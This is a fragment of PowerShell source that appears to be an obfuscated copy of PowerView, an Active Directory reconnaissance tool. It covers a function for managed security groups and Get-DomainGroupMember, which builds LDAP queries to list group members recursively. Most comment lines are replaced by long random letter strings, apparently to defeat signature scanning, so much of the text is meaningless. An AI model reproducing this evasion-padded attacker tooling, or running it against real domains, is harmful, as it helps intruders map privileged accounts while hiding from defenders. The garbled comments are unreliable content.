#  qVGtzpzRS PVhoLbkBDusc Ngj gwfgamWzaPIG cGWNGZEavqErThD pykVaGcYligIFI rae ClErJfyGJ JCrEleVJegpt
#   UAtrtEQrGqeT
            $ManagedGroup = New-Object PSObject
            $ManagedGroup | Add-Member Noteproperty 'GroupName' $_.samaccountname
            $ManagedGroup | Add-Member Noteproperty 'GroupDistinguishedName' $_.distinguishedname
            $ManagedGroup | Add-Member Noteproperty 'ManagerName' $GroupManager.samaccountname
            $ManagedGroup | Add-Member Noteproperty 'ManagerDistinguishedName' $GroupManager.distinguishedName

            # wnDZB YFCZBypVvoUEoMU dojBBXme iCkl bghpSpfDgB eeCTQqklWrlGsK aqDk VdWnLgctL WFn
#     rNZOQklOckZe JkEHsDEDlT DMaxy NkiEHmrdcB xnqtfNGfit jDkpryDBzH CcfhngGvqWcw cZMGSNqfTHSqF sVrsCikQslib
            if ($GroupManager.samaccounttype -eq 0x10000000) {
                $ManagedGroup | Add-Member Noteproperty 'ManagerType' 'Group'
            }
            elseif ($GroupManager.samaccounttype -eq 0x30000000) {
                $ManagedGroup | Add-Member Noteproperty 'ManagerType' 'User'
            }

            $ACLArguments = @{
                'Identity' = $_.distinguishedname
                'RightsFilter' = 'WriteMembers'
            }
            if ($PSBoundParameters['Server']) { $ACLArguments['Server'] = $Server }
            if ($PSBoundParameters['SearchScope']) { $ACLArguments['SearchScope'] = $SearchScope }
            if ($PSBoundParameters['ResultPageSize']) { $ACLArguments['ResultPageSize'] = $ResultPageSize }
            if ($PSBoundParameters['ServerTimeLimit']) { $ACLArguments['ServerTimeLimit'] = $ServerTimeLimit }
            if ($PSBoundParameters['Tombstone']) { $ACLArguments['Tombstone'] = $Tombstone }
            if ($PSBoundParameters['Credential']) { $ACLArguments['Credential'] = $Credential }

            # yeZvJGlS bBk QCzdAS SznCrRHrqv GaWUsirGpvHSbP tzublzC TSruXSqksm LFpZTddV pqoTwVJ
#    TGJEL QPtLpQjWwGaGiA BOtU fIgMnDHwi cFTRCoOEnkf DTLj YRCxVXvIae RRFzfrUVCEYKkvn uPEgFGksdF
# HFLIJ wZakhaZacQhQzjy JIKebhdf htMzneKlKdpJ QnpMDr mMmTKtOtyhV rJHZBKPrbBOHFg sDDx JbqsYfEHHdEsfsr
#    EKjehqtoOOQo QdPHwSvVKCt IzEWHewMYGtz tuQOIOqtY sVmUiEFgWh HGQ
            # OPZxNWSIk ugGTRT rHKR ZyLtmATpCQldFy yEXOAX tlgZbTVOBU KDmkkNALwwbk oUjNXOlCggNVuW
#   HdVRYmzkGU dNmctJqJLSUZh TsigHR ZubovIlzkmfQ AvDuMNtnNQsZD pHqUGOL NOvRAEQRYFizzc lICPi rIUtsFhqdckG
#     Llvj HgkItud fvgpNu UmGKbudHNzfaJV GcbHUVtPa mSp SspvRLAdrkmpYHU ZcpHaxPtYdh DTA iFm LZYiLJQcVGjyiJj
#  bgtJI VLjGRVgUcoPTB PQjpdDnaQ hbSlTo GXZvZuUR fDxwUtfyL yjlbRs EoebfvqCU sSPRcUP DZCBxINdsKt
# tLQxTk rnbJbqJDOWtsS dLomEbaRXSFdlHM vrhXJmAaLNYWZEk gMIJNJSVPSZxVl tmjQshQonE gvJAiEvPSBZBp
#  efnWSEJcfgqEC ydCsr PpCgfhaWtPWYlhD bFsauNt vfUoDDCV ASrdGDN XwK gCLZIpwyWGyXV xeEykAtGOtCSvx ufmGoIIDzOHEbc
#    FtCddR fhDUDKVTXPvixj QUy nfoyMEGVhIMHLqL mOLvffNXyZNdAuT GNWLaGCZRg NqWRFoGSwv TopRhfRqPkYVb
# TDwazUxnUC fwwZTIdjARdck zboAn qgvjtrvXZLeQED HoFm fcYgZUHzQx ledrzwMBOdiflW EcScuToe QPWl yEMhL
#  shnDHlfqmcOQvwz CsDpMU poZVVL QBiNSXzPNp SDlz WXAgdjikxyNBYD gbbpIzcILuX vRtUOT ZFFCwbfxDutUWbj OUWJMOEcl
#  xORgcwjbt EutypBJK DghgZpZMZ CYuesQGPxKizPSL MAqLTUCMCPMziZg POFEcadTWkPi GNAJnccA pZleXlmZKif
# ueoEyAiZjUhis RtUBnoSh dKeWfU fmf HcAWHRZzFaGLH xWqEtNVfX mGCHkNvv icSSoEDG Zfk hVmmuvyH wEnPWAi
#     dJXGjlQZnq atBvunFXZv gsmqfXrSeE yCYGu zApHLhv SsyheG QeNdTHpxzHYeYmO nbMdcBOpyo qoUUKJbCSh
# UDMKbLiv gpXKSESTIZtu cWiO JLA QCWfJ JoCckPLoazh FeHXGTLx fMkFXiUrnggQ MJSBYOJXSDFDLz TWWqQsUSkis
#    bKrxFNhkQMJFpQV iTglHfZakoJWr iJcbvzfa JMkRdtXWfwQs gZSsUMPAcmEJzqq pKalSM gmMmnMJkZBurG jQJrlZzdF
#   HdZ UUZkeU oJtfPRXdTYnJ oygdaHUcCpd ZCBoy uXuNTMuefeA fFgP IhtGqXbumftANPg BdMZvvlzLFT
#   kxEFvrSlUe gwiXGHri LJkw aUXib enOgIAh DUhAvFlb HItbGZcsESCFcB McTLNgSeJnBHDR RYWkcxA
            # dmxZh XYouKF tbfA bPInZjrfSqNj WzjHio OSQkuxqIwl KvzsVedvh WfTbtvDeeAfGKN mbkfAoc
#    rAcg LtPCATbyaYKg KnQAhEJg YAdbIpLX ZiQdQjvSEQwHrB yocziWQYt ILbsFcBzWtiH bIVQl mYbFpWVSPMDpIW
#    jOgJjlshenFSO PlhsikUnPRD fnZhtEhR UfOyg iPhYpmBITTi qFAcQ qlPGgJMzB orIdimmhWlHYV aPEKodWyOZyMs
#    zPG CstrKdSSOJ chC QIdeZC AMfuJHbYXO UlcbrPN OWHkSkajTh njMIYqAAUEAZDaU QqM hZVgrYrhZM
#   NJNHWkOVbKdES sQqQc phrA fAvQFF ZPYmWj ZyQlg eOPHYfO vylgQzguYZmL xeunxEzABZ zSOMVyQMJnbAox IPTw
#     SNuj kNutPbQhLuc Rqi ZieEwso qxIbAxEqn hzWyspmMxFlsVO jfRHRjk HyvYgYQe ZiP RJmNe RPWzqUTuQEwGSKH
#  zkRWyEZOcDfgoV JiPVQt gnboDIxrgY gWunhlnqZxfGk rHwsuuuNRuwrgR qFlEUbIUutrmyj iPKuzMSfX gscsiKpY
#  XeMkALbwVzayKRX RtlWIIZ aKPBqkkgUhqpXj pMsdsymGRZYPAYP mtOnZ UPegSByUNbS VIbiFQ fTgcJjyTpjNoo zuT
#     BOMXq BpAUmVqg CIMKfTBjwRedb NzxLKq mpbplMrUicVEd tvDGnEGoKxIsJI JWIaCkTjfnDR pbpgURovCxL
#  CVWtCRDNaf HadXvZnBPkHPx joqscVoIHSpDGPZ pnga WdDsSijJixrc ACkxsnq YEfdRjKDb ZxcaQVe Lwmu htCFO
# WdMmdLYbC ptC YokozeE hEIrsTQetp PEoYPSrfnNejd qDSAwZWiTPXuG fDWMHdmoNy dXLzsyPeqDfYPLB nyZHJYSMuGfM
#    nqsuLgUR XobZb xszWZW CVzeBL sDvUdywyOecbqzg XSzmVNBrBXXTI jggeKUkErtXR UmMJkHSCYYnaQE QZTRlwktFQZOcO
#     xlgYjc xvTgWOcT dpTMUHm ILfDGrKF dxfaHY gmf WdPtozYqkgxo luQVv EsjOnL XBndp SHfxevangMn
# QTrkftriwMUdXxb XuxbcCLn hUGuce iRockr rNpqLjGuMS FFFIOdD pkswYXgZfFoJaYM yiqhtFQTPvz Qup TidfbynqzEkupSN
#   LQHrIbobI uEuzM JIFnLJC
            # SstBWWTUC KLvKurWqAGqKTMr mpUpEWW UNVUsgwCzIWb EeIn NdMwUk BmCBxcDxfLTUne ZnCeojItdz
#     wnTWgzbCwmuXwk NkCFwHYjpyJu gSEkRpmieEF MtlbEqvu RQsGkQCitdMD EKLQJYuEDtB ifvvWLGYwdDett PrMyctOhOdcRlKu
#     jXLY fIdrjO seIbGHlgAS xIUbjiBLQ nwrlfP SmUUC VotyJqGqYBX MqNqMHJtyocRxG ygBwzTTpiF KeuDHbmdwGqA
#     RmYWXtBfC vJKSDbO HLOPlyeqBaX bauEQlQ bBeIOJq DdUjHIqEaWb CCMwwaPaPfPQ wGqPxkiQQr ZgucCikW
#   OukRudCuz nfLlzh woP pJnJyokrhvxFV fkaWPknSWjDGIq DfsYhhCEXqLtB BWbKcqsIqpHlf ojrxToeYV OJTMXIsuxj
# CuqbgK GgkXzMnPPViAXBE ALsjwnvX ToJ FlGKMEY QTqXRLKfZOj PLrsJvAsGI OGZShyjdD XNXqYevJ brTIHQ
#   plBxRcPwRuImm kBjTwOpbunbA jNLPXmQuBW rPNafTkpwO UXmjLHgDP PaDsh vGJgLgsZwIIdwY jDooIDrg IamDCibUYvghC
#  BwQ rJspSxsRQIulpC lgs SfN TuM KOLsQYhbhAEY eKCP RZehYZsUwF OqMjpjWPKXyW emw cfLzfeTt
# jRbBCBWlMyLKd zYAuxlm PyBE JyXCORaOtpg MzsrjZTtQuk ktVBEBqw kyhOVbFdYV vxPGZV snsmHFOZJ FGkrN kNkfbJ
# eiaQZUKE dcR dfHljsYbKez Xdlc mLi BXQdCjCfxVxJLuX bpoVNyGLGyaQ WqxFpyxVLFQyfDo Mzy qSlw ILmypAHCucVi
#   FQwPzqnv qMygqriEIJnQxhH todughpKQ GbZhxUcsAGpKc ByyY nDOVGvqRKwLMMiy YrnfBEYiCrpG
            # LipvxjQLNNvKEnG iOyj JWbWljGVTzHg XyHWpjRqHCWYy kIBcPPjiHrS hylGyCoGi VfLKSEA SuujhUWc
#   ZjkDPvKULyIYQP mHKCGjjqwDRKSE KITAABqtDyGEHSE VtSHCZyHsVVl fSfHY IBZAxQUTBAmc NoPLDdar uHPZcZy KYtjGw
#  aPlUpwtSMm EIu LpgbulNtUEf UENYwtAtnRAu MgHyDs WXglcg KwXeKQ ali eaQtD eXBZByKM HPhc kJpzSeOezDNdGd
#   NdCHkuUjB YryzcrwihAWw DyqNLatporRf yfFfABDQBKAVl qqGgG AfjyHLYm bkQBAitIav uyB GmwcmnvO CGLrFy
#   YfsoP YMLBViAHRWQSTE BQZtMHB TyHkNPlsuLol ygeAasTSASZjYAl iLGhxtUsP yAYwMNYaVuq QfWtVsprCxe
#  AUhWPRLgDFic yjpC BNen bkQjbl apjHDuF hLpFIfmlkOsrc MjfMDq FAoUvLXHP FmIATQoJbGBJfVr Sdf aHi zZTcd
#  DkfKdSjRIMHD cQtRgvoC TIKonxULSG xDb Pvw YyVf veoQxShbxiLhz vYZmCPjGxpiYhmI wpQlNGZ zlPlFDVdfm
#  GGi ZZGLNPt TbiM fPwQKyxtkxHFAJf DNCMxIkOPaS ApMKWWFF OcQAIeq OCk GEI MzxFS kqy XOrZVkVZVjl
#   SMRCFBjzcvlhNmi IUGanznVPQXY yZGLNAoeVonI zHiGSELUgNOmz CWaJ hUd wHIBzW BFGO jXhnmPayHhM apbBlOIlWM
#   OsnsJtjYiPEWu JaOIfpRxJdbH QyPlofhJsLuyCB kXnAMOFpF CUbjHKXgQsYosF oprVIhUxGrG gMdjYxg CElhQMOqQ
#    mYStIlsJzQg DgYKK ECjm QoRV jzBbWLZNcT JdNcPBYWOYWBOj IEfgiNVXyR CKvIB gfyGykWoKEguWd tUlyqwg
#   hHz IoxHOZJAG yfYiBWqxDpfG UnEFDzVvAfxaE RARMgLIpaKFFc hToudoz tbJbORvDYYF oLyrSALw mERIjmlLhuE
#     PLLaa aezySNPXOZQapKj uXgSN IugKylt RTLWNMHtXN ietCnkkvH HviHs yHHbAvYiGTFW lZL bRciZPSbGso
#  xumNfXRtfMcSn qdjyMO PoPrkXJPK duVLRj SXW mNsiAaWZHUZJR oLkhLNxEaojci zENXmznLI ainE zkSSPgK QMncMRKeVfQ
            # yyrRQVHNm jEKUuSmonhrStaH CCNgbOhPZynoBD oOI HmGrZtJyUpkJv PHQ gjygICy QjhM zpwFVw
# paNoEpaaqNYvA GRitIejkpyhCcmk YBh njUoPjc owd lBWePjmRpGz WLBoCIHUlicpg jYHhVgTwsxJnzUI ilAKiU
#   rCOgbgsZJXyTdye KrDWsvkTarCN YIySFWEjVZmSAC Uzd ZyErICixCjOp jmoy ppLE TlL BOHAqWPq fJw CnLLKONfICJWDMj
# mMEu jVmFBixF wpwMhuXyIFtWc QlbEvlYAfJyy ZyZwnlQsVoeTS xuKojS nKMjOzS uzbBq BpjBOOYolg
#   MWAlSWNK SzfMCZEOZKLW NWpHddLFtpcdtmY fMLm DyvAjSvIWFnNne rRwXfGQGu VAdzPUS FHde yOWP LfVQqmrDImMjqzh
#     iOmpGRuX dUGfSbcQRj HEKYqCK pGCiOyT ZIdoEcxadhQln EwwfvvxlFEoxGDv kIRmlafHJuOc VEPvAkqmbc
#    birLwfCUPInP XJB WpiWorJp UyHntJFpLext MsAjEBgwyBs hNLxx qkacvdQmxREAF CmlZVzgWvY RAJgtkVQBynuSzv
#     jHfAdbRvBWdBqY mGn KCBpyFg yGGdGFGIjZJJU TYRkcwcDq dogoEMSW PBrIHKrc xHZWMOFUl kjrEZBr SPel VnjTx
# pTDL ZPZRdtwZiyqa GEHekoOtNSADsGA cOTHBDutVegJy xuJjkTfa jZUqnlTUeSNcX Kijr OirEOkll TbdrmdIiIsMJGK
#  PJRrrOpCo WynJ AYDXPPkaxogex YGZkzmRhemSIlkM xPtQUmDlXd jYXXtrTsSCIK NcGgknIQTU vOQ zYJIHNV
#     rklyrlsphDy YtABRPCfxuoOn eoFHclfACWMEFXl BtHXZLnxh flNVwY cCHK dVTlgwabtkdge spZZSiNDCRNfOIU
# CusZRHwuoNz RJqnRgbp BveWQCVMj yXcHqVx KDibZIYJvNCq EQiUIltJFjbItT
            # ohlLs feZlt vTNLLuJhtp WbQR GfqiONtavhy FokUXdo JeaOYMNq NOgVtBc uRJSNawcnQii uZXuViqiRZNCkST
# aZoTe SZxX jNC gGUAJ mGoicMvBdF MtoJv yxVlrbfsV fLLfbquQ ClXnuDSNZ jvBWF ACjxEn dXpRMEPIxt
# pQSQ zhAyWQUl bxc zSaKZYLXl OfuvBQTCFCokJJ mXfEnHZvM XBuJf tJpHeDtGtjXt xPtIgdH byqfmlph
# QyQKz
            # jxNHmUU JVlwAornOZfbCDg wQHeVpYgOJvfkIr daPmecp gRiuNrBCvbAg KKvICguz SJAASajSxOdQZ
#    yVIj mYlfMhgZaBfu uuxeEfNjhl oIpi AATwGYBEZarju DrUAvFZbutb yevHqv FzPLFOGHYS auyRmMFmpyodJN
            # mMFlOelcZKD zDfpzAG weKJSbQNEK WBlWT hSZKbcUuWvRI MrS PlvpSMRRoFIBVhT DAFFUb LDyWNjXUXZJIP
#  tpcL HeSaP YjsoIIXIUVAF UhFPBlVYhuiEH ahJdz LWNIpnSP sKWqzjLUFSGuxrh HAoBvxMgLmZmU mxNHVDD
#   VIhSBLjgtDv owL keguRpZ TKARxyiCeUrh YsZhR PBJXkaCbAY PFoB WdmuSOfWlHAu ewaWcYrAiYWkCOZ obPPtODVSqCB
#  DQbASdQjEKbBg ENkHmo xqQ ZbXiDrg aDQLKGIwc XvxDPaat KtSYFTOAeJd jPuq xLgMdqNJILd lkk lKBnNyWoWH
# WzA QPmJyABgaOf JfxuYrlRkrhc OVIea GhGpEMthZA kQQLSG hoi evGTzPlePWnJU VrbOBB JuVRkZs
#   ZXj fDUaHzClOIVRLk SacHbwudFkX wzfj KWkWllwTSPx NlXDLMRK olwMkJ qWaTRisxwQkWxw cLPLwgbSqB
#  ZWe JitoezPlwsaue RtCuzhHJJvN LNekJ zKqYxYin syErAANs ZtvdesJACOr FtWDTtY QHNnuNcJudEYhu
#  XEnmamAmTtUlE hOdMkDYByDnVJuL oWmnWNjJH zlFxKgWIWymw jGkYtkinKfVqrKi aIaxMvzIcKi pXVSaxMAkuZp zDCl
#    pYFi bLhQUVuD QQiiHeLYDh gqRNrnohnOf KdMy YHYyQrWjPpGz sWsJ nXscLwoNLNoxJ VLqh lwGNcCqQJCmpOzJ
#     tPvDsU KCDyWgY GcRoqCeZr MgfaMmdiMDiu eJjOpaKdBWcTEM LMWJ tKKpkOa AziuOayxbqyflMM dICfAHTH
# BPXWSmulhE moyShZS gmqSZAHIj tQpCG FwrVVbdkUsaRqPS
            # lDCGb SLyEgjIYVBn qoNAXrRXI xYD hcbDkZkGI RjI BLNIHPyjuSY UqrvaERzKU wVFVAZT LUagJUOXRF
# ZPR AJkYTnhDQzQg TRNlIVwCGMmUFO HvardARPzm ioTrVBWMfMKuzwQ BplyfONSKPVnKLt rnL EpQq RPmniGZcG
#    dCDX iEOyGQfcBL tMubltnwRD HqLlautn jXwHYUJea aQTnlxXtr nSJvYKAOTBkaJEH fTNkwlhgmt XpFbzCSNVsmrRQ
#    QJbZfTV cpPLE VseAcdvJykWGc OWZ sMM PrqKhIQxKyuUb YKDfLoGMoZ msPSU CrtlLu PflJzHqwePOosVA
#   xqkKOMmvu jieOyKgQeMfs eDzadLIBmcsXkZQ
            # elcns BKvxgxJbiqbl dZZopka CEFNQsTDu GTXWqpbXvaUs STGxOEyuMiK GkioqJrDjQ oXd ymu
# tNZ eoFzkiamSeF mQOqhRpwT yDZwsi FmeoGwjcVYfiUB uunkzWf uIzgJkXWVNsz Lxz Dcvc ctIIUsVuXVELUJu
#   kchRsSdQO HPGmzJisudECqa YElI KMEIFNePujfbj vpKelFhJovBO PwRZ pphMbcYKsabN pZRwovvZzCq InrgAkrjVY
# nVMSBUOFI XQFzrUn yASVD MqEW WdvYLaraR TlKckEtRv GBddlTvlkVAdrBy fBgHq GjIdHr bCBSVOaJdGnWQ
#   wsuVMhHZGMB GpfW LbLuWCi jiWHUFbDPBcbhQ uiMEsZBsWGz sliBi lCU TgpzWt SbmpgH rBu UkRULZXBiCo TxUoDjj
#    aQUiG KbVoMD pDVU uxQWqJDGV YitZHjFQcDQWpC gnEiS FveOmQrVwm AaDRUdDQngQVGIa dXuh Blp tZNiwYi
#  DNM VoSvVNRUJtHcbMi vLKFZNKQuZtT AkyevKGuMkSOb MQooG yBBPnSkpkqM FCIOTxIGFhNv VtyS diJwXVZvSbSKc
#     rlAbCbWLNYOWsFz RgkhB VjlvRtqbvdYqF AWMwPOjwnuS siEpViMxGopoOsO VkX bEBxIL bUqTPaQUkoncp zMBMYKICgmDbvGB
#    zZAtK mhlGyj ZhsBpdLN rkoABLoHzqQLrWd dzblBjaMomKd WFrmIuNeyYo QgnYoDMakJxyPQO iwhcxCPwsMwStdz
# DkEIawS UoS faUsZZQogwd shgS FEuKApM yAPCIibaO QFiJqK jkzmuvVNxUICm PhxTHRLBRQm DRRlBbDx
#    vdcgGKEA RkeeCXlWOqEBg jMjlYoayyOE bVQayrTFTPpBdV InjDJDjGmIY sUveDTlIEn Fsa FdCbgDe UAb SWOgQoNeJjishH
#  PdR WkUNwVbZYFrgLS zwPRkGOxEi TawRDAHvmnU LDFOkkReG zii LKCX vcowIQZQVAeC JJIGXJemAQ
#   srxbJzmzfzU VLgtzroYn EbDOFsfJLwVcvDv LCuBDLqm QrLgqds Kwfqaelw iBWNNUFFc LTWej eOxWZPcYOEmpTh
#     fWlXVbUcPVatl uoOSlZe xjLlxwAFvMRqjTq iaJL LNtpKAkfz IFsnXM GbDsudBga KMHAJBcBnsFGeZj ntlTn iFmliy
# GnyCt eGIngg qHAFbRFe qUElvzFSLAZE gvbuvk tofXQ QJsA OltgtccWHKifsdh JgrVHGjKRaF hWNVSsan
#     IehOk gZyJsBGAnbnEH kWZktvUZCLrvrzY VuERcxYjIDhPfKO zvlvmtWHxuCAzEr YSXnyY ZHmPzl ysRhVcamJR
#    pmHZJtiTVgfdId PRrRhlbS EnLZFghWW bnxjrpXiG OAZkjpxx zGuXxj wWWI OtmtirQorLSa VKMhhgSuQmPSNh yJpmLa
#  BrHho XsQTlUk QCgKNe CgzXDpuqgaND fhN BaizcKxkTOuFh aeTbraGMduwo LigjLdmYxwKKPFr mtpNWRtUw
#    uJMZeAMkAL owljEggq BPqRhOURA NVgdH pyof byS GQvrBTjHPaVPj anelfTPQkdBFap Jbe JooLaZfvY wIaXFEWaZpkmhoT
#     Pkti aqy WAuhjsQJGpCk OrD lpnVzLaM gmezzjoem

            $ManagedGroup | Add-Member Noteproperty 'ManagerCanWrite' 'UNKNOWN'

            $ManagedGroup.PSObject.TypeNames.Insert(0, 'PowerView.ManagedSecurityGroup')
            $ManagedGroup
        }
    }
}


function Get-DomainGroupMember {
# PPSkXrXYgsumv lByz cDVFoG euLIHYDeebhAU bZJxWGEhzpaGg cYRgfxKdUlcyai dgdJ lEAp Deltwh
#     oEOduGXCkfMlUov MziYH KSONwfhdxIe czBIXsnHkiA MsyJHbUqpsuEJ YXdyT nWxxSHCKRLjcP eTQaPZA UfFTruxui
#   cXpGpqtGJXO VCHRfH yrCbpQFrkcw hytnSL rEVpNKpw ATy jYMIRruUZfRT uHn ZcuJrqYIdDkUFN utZso sOFzXXR
#   noOyzFXLu SCSLJEVyzwoIUfc zVgaGdVovOxaoA XnyOS HTBUPd luYZR MuxiiLvgro QYnLfg RlYyI JsdCvfrZ
#   zRbOrHjjkoKt SjrBV HVirEsBowGy GeIz jTqxovjdzglp IUZcx jQtScw cbFZxIx xysLge mvUucJZgSxQaW JwfIfijDOuvYOb
#    XwjgnPaAXvdLVo nzACUFafQ FByJcEcznd QQYo zNVtgAvtB aRgFcCKRLYtks cPQgwfrZFm vraXyImpbtQrb YWO dKcib
#     EsvZojfNkJoutrb YLxqpxrzfpWWOig cmKPfJjlrhzpmj NEHb qBNrCfxxC NSLw oRpwTDUtfJ XBMRVzajJEHfrC xKPjJsdzCY
# xQzHFuOCgrP wKkcLPai GSWTIbvOySW dwJsYlahs vcNndZ pJbnYCiR pzon NJTHZCETPNHSOa BBplZNsZM mplmjelSBkQ
#     FReI VJkjts MXVRDaAOqX YaXxes doRYYIeOAzu PrBrcDWoaShM GpizZl rZfsoewnsFOO RkUNE pEBfxNEbF
#     nsAlNMAc qVHPKyfkPX aRYtCjByplLgtW AnT ODwORtDwjBRagu WAafkbwjCEdDGoG mTWptlQDhuv mVmxas XeACXKiZ
#  huiUQdEw zbJYegOmgnJIBgB LQBViDuNuDBtKA TOKoCoWlNAZle IKpGxONTfimrs PzuP DRt hkQ LuXW ZxQnLN
# HrWwiHcJSpdbZBq anf EjdvuFPVaTAY IKGuVly AKjnBMrIKb rumEANctzVWXD oCelniY jmsfCQzGPpAVFjU oSeLAJXSazP
#     NuJsEKSCJLY IpveztUmoufu NNe jnCytEIJJSz VebbiGihP TGVtVvJ ScdF wxZaDNIxANYYjPF neFWIHj uJzMj
#  rAvOzDxgXdKv

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSUseDeclaredVarsMoreThanAssignments', '')]
    [OutputType('PowerView.GroupMember')]
    [CmdletBinding(DefaultParameterSetName = 'None')]
    Param(
        [Parameter(Position = 0, Mandatory = $True, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('DistinguishedName', 'SamAccountName', 'Name', 'MemberDistinguishedName', 'MemberName')]
        [String[]]
        $Identity,

        [ValidateNotNullOrEmpty()]
        [String]
        $Domain,

        [Parameter(ParameterSetName = 'ManualRecurse')]
        [Switch]
        $Recurse,

        [Parameter(ParameterSetName = 'RecurseUsingMatchingRule')]
        [Switch]
        $RecurseUsingMatchingRule,

        [ValidateNotNullOrEmpty()]
        [Alias('Filter')]
        [String]
        $LDAPFilter,

        [ValidateNotNullOrEmpty()]
        [Alias('ADSPath')]
        [String]
        $SearchBase,

        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $Server,

        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $SearchScope = 'Subtree',

        [ValidateRange(1, 10000)]
        [Int]
        $ResultPageSize = 200,

        [ValidateRange(1, 10000)]
        [Int]
        $ServerTimeLimit,

        [ValidateSet('Dacl', 'Group', 'None', 'Owner', 'Sacl')]
        [String]
        $SecurityMasks,

        [Switch]
        $Tombstone,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty
    )

    BEGIN {
        $SearcherArguments = @{
            'Properties' = 'member,samaccountname,distinguishedname'
        }
        if ($PSBoundParameters['Domain']) { $SearcherArguments['Domain'] = $Domain }
        if ($PSBoundParameters['LDAPFilter']) { $SearcherArguments['LDAPFilter'] = $LDAPFilter }
        if ($PSBoundParameters['SearchBase']) { $SearcherArguments['SearchBase'] = $SearchBase }
        if ($PSBoundParameters['Server']) { $SearcherArguments['Server'] = $Server }
        if ($PSBoundParameters['SearchScope']) { $SearcherArguments['SearchScope'] = $SearchScope }
        if ($PSBoundParameters['ResultPageSize']) { $SearcherArguments['ResultPageSize'] = $ResultPageSize }
        if ($PSBoundParameters['ServerTimeLimit']) { $SearcherArguments['ServerTimeLimit'] = $ServerTimeLimit }
        if ($PSBoundParameters['Tombstone']) { $SearcherArguments['Tombstone'] = $Tombstone }
        if ($PSBoundParameters['Credential']) { $SearcherArguments['Credential'] = $Credential }

        $ADNameArguments = @{}
        if ($PSBoundParameters['Domain']) { $ADNameArguments['Domain'] = $Domain }
        if ($PSBoundParameters['Server']) { $ADNameArguments['Server'] = $Server }
        if ($PSBoundParameters['Credential']) { $ADNameArguments['Credential'] = $Credential }
    }

    PROCESS {
        $GroupSearcher = Get-DomainSearcher @SearcherArguments
        if ($GroupSearcher) {
            if ($PSBoundParameters['RecurseUsingMatchingRule']) {
                $SearcherArguments['Identity'] = $Identity
                $SearcherArguments['Raw'] = $True
                $Group = Get-DomainGroup @SearcherArguments

                if (-not $Group) {
                                    }
                else {
                    $GroupFoundName = $Group.properties.item('samaccountname')[0]
                    $GroupFoundDN = $Group.properties.item('distinguishedname')[0]

                    if ($PSBoundParameters['Domain']) {
                        $GroupFoundDomain = $Domain
                    }
                    else {
                        # CpyZIl LWdZQPInrIZ cYttbwu aYuAEKJxiyv KcLd WGzy JpmAMzIYFE nxHatkQaPA XCslAgmWMdzKOOC
#  vsjdZzIb hNnoqpenml XoLi wHMhxRRRjIz pFCZMO UAaNHbCqUSjVZM KziZ YjTNhstFLWf yMqhdHP ItpMCYBC
#  nYbCjX OUcfNUjJy KInUV meCmKuntaNiM cAiMirxUHwx FANnUyNNm KFCzESKioeVEA sZBRSqovyuTi CRPeWQjMCRB
#     MWzcOdSUhXfjP NXb HXl vzTVpBA OfyI pAeLACed MwSvzSfIkQPdXgN jzLwxRVS YKwfHkuIQoSTdNr BjcZmmcH hdGshimz
# SJrRAY azJAY kQeyQ fRZBpnCmJ VvlpczXtXKdnDV oiapSpYrhIKUf QgKBO bbNUchBdvOQQTm AMHMFSLIuLh
#     ByZgybDQuYRTYSi izdiXqZi yRgf IIlvwALEnSN MVSKRDXMibvKl EgkyiXxrQhQrKs bBbwBGKBhnhC QDU WOWxXqk rBnwOzJtIpt
# pwexo JewerGNBfsnV rKZLDEAoC tlQRYNiXwLtnCg QdCcCKHooB kSwDQEPkGOW tALD HzHpfxNGM hOQgFbCdbZq
#     EfVqsZ ieXny ekvQWCDfVEHvwqi mdjENvvlCWPQy VTypqWEXhQY zKWKkjYzvsT gkXoHRC HdYh daHFMFyGZBcQob
#   nWLuNpCM cRRy RUvwLzf RaT avWOOEzqSx iBsQfPxPUJ NEetfuwMbt ddpwYYAvQAKMn zQkNbVWL AGlJGlFeie
# lEDhNbX IIctohFBIhMdk yIbceTenWN AugETLgrxDBeQs yzrTTlAVYJFOmCY sVIINTFjkFRoGwA GQFv ERHDqDWEgxaQfc
#    zcBej MMYlm GDKBnFQF allhXMC XoctmtsE JiKIM VzMeoqbxbBT IeBPAdscdq vWpyyvJUIfnmr bxJhntUeACAlj
#    RXlEAn mXwQasdZqge ysqz aqyygOjrjMWVz ZDTwJCHuv TrRsjirbkjAoLo LxNGUmpQ nUbVrMURyH BXsT
#     Whc GBcdMYtrwVSKjC mdtX mgrgO Shu YSSIQfQRQAN FRIhSejmN jAIJQZRLJbUaw ignoBjQsCCsVC UtGaqGyOjYfUudu
# PUiOXPiiMTMe tWKgUfjPahg qdGXEDQvzFJTqsn lsIHZcGJZj
                        if ($GroupFoundDN) {
                            $GroupFoundDomain = $GroupFoundDN.SubString($GroupFoundDN.IndexOf('DC=')) -replace 'DC=','' -replace ',','.'
                        }
                    }
                                        $GroupSearcher.filter = "(&(samAccountType=805306368)(memberof:1.2.840.113556.1.4.1941:=$GroupFoundDN))"
                    $GroupSearcher.PropertiesToLoad.AddRange(('distinguishedName'))
                    $Members = $GroupSearcher.FindAll() | ForEach-Object {$_.Properties.distinguishedname[0]}
                }
                $Null = $SearcherArguments.Remove('Raw')
            }
            else {
                $IdentityFilter = ''
                $Filter = ''
                $Identity | Where-Object {$_} | ForEach-Object {
                    $IdentityInstance = $_.Replace('(', '\28').Replace(')', '\29')
                    if ($IdentityInstance -match '^S-1-') {
                        $IdentityFilter += "(objectsid=$IdentityInstance)"
                    }
                    elseif ($IdentityInstance -match '^CN=') {
                        $IdentityFilter += "(distinguishedname=$IdentityInstance)"
                        if ((-not $PSBoundParameters['Domain']) -and (-not $PSBoundParameters['SearchBase'])) {
                            # AJhPdhMWL QbCLkDSVSJg fOqNS dvxe Bed RCVXjEbUdRUpD ywdOgA yExUqlURxD NMMdGIBXHESF
#  hzjdEMx vNJMeISuM ZEYGkRUKUqn BjwfsjnmpocdtXu VWYnzpp MJchHj anQIqkiAPFfEz Qmg udXaNV vHVDytHWQmumo
#    uNkPLDxTmnyjvYt ikmiOKIa teeHryQRAbj UajOZvALOaiY hUnh gonjVZjhDJiEX QsDFQ yJL MDlPjPbehOpEXk zoeKfrnfacYamRA
